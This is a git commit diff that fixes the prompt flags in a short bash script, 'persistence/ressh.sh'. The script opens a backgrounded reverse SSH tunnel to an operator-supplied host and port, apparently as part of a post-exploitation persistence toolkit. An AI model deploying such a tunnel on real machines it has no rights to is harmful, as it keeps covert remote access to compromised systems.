00a0df0b321ff59e0482f31aa405be31fe0f5fd6
ChoctawChief <dt52hhs@gmail.com>
2022-10-12 23:39:51 -0500

    cleaning up

--- persistence/ressh.sh
+++ persistence/ressh.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-read -m "what port for proxy chain? " p
-read -m "what  user on local host  ? " user
-read -m "what is your local ip ? " host
-read -m "what port is 22 forwarded on ? " ssh
+read -p "what port for proxy chain? " p
+read -p "what  user on local host  ? " user
+read -p "what is your local ip ? " host
+read -p "what port is 22 forwarded on ? " ssh
 
 sudo ssh -N -f -R 127.0.0.1:"$p" "$user"@"$host" -p"$ssh"
